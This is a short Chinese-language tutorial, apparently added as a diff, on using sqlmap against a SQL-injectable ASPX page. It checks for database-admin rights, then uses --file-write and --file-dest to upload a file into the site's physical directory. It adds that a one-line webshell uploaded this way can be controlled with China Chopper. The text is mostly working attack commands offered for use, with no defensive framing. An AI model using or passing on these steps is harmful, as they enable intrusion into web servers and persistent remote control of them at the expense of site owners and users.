@@ -1,0 +1,29 @@
+
+
+                                           作者：拿破飞机
+
+---------------------------------------------------------------------------------------------
+
+权限：必须为dba权限
+
+file-write	从本地写入
+
+file-dest	写入目标路径
+
+判断是否是dba权限(显示TRUE或者FALSE，TRUE即为dba权限，反之不是)
+
+sqlmap.py -u "http://www.xx.com/aa.aspx?id=123" --is-dba
+
+写入文件至站点目录
+
+sqlmap.py -u "http://www.xx.com/aa.aspx?id=123" --file-write=本地文件路径 --file-dest 网站路径(写入路径)+"/写入的文件名"
+
+sqlmap.py -u "http://www.xx.com/aa.aspx?id=123" --file-write=F:/a.aspx --file-dest D:/虚拟目录/Front/cx.aspx
+
+
+D:/虚拟目录/Front   为网站的物理路径
+
+
+写入成功后，即可通过浏览器访问，若为一句话木马则可使用中国菜刀进行连接。
+
+注：网站路径必须为网站的真实物理路径(即绝对路径。也就是从盘符开始的路径)，否则无法写入数据。
